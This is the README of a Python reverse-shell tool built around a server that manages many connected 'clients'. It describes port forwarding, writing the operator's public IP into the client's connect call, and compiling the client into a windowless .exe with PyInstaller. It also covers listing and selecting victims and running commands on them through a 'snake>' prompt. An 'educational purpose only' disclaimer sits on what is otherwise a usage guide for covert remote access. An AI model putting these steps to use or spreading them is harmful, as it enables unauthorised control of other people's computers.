![](http://myspecialsite.host20.uk/Icon%20image.png)

## Overview
This is a hacking tool to get a reverse shell.
This is tool is for educational purpose only!
The responsibility on every use of this tool is on the user only!

## Installation 
Type in the command line `pip install -r requirements.txt` to install all required modules

## How to use
Make sure that you have port forwading on port 42424 (you can change it if you want) to your computer.
Type in the terminal `python3 server.py`

## Client
Make sure that you have you public IP address there on `s.connect((%PUBLIC IP ADDRESS%, 42424))`
## Conver client.py to .exe
Type in the terminal `pyinstaller -w --onefile "Multiple Clients/client.py"`.
Then you can delete the .spec file and the build folder.
The exe will be in "dist" folder.

## Using the tool
Start server.py and wait for connection.
To see of all your connections type `snake> list` in the interacive prompt.
To send commands to one of your connections type `select` and the ID number of the connection.
E.X.:
`snake> select 0`
When you are in the reverse shell of one of your connection' you can type `getos` to see what OS is running on your connection machine.

To get a list of all the commands of the interactive prompt and other special commands, type `help` in the interactive prompt.

If you want to quit from your connection, type `quit` and then you'll be back in the interactive prompt.

If you want to quit from the entire program type `shutdown` in the interactive prompt.
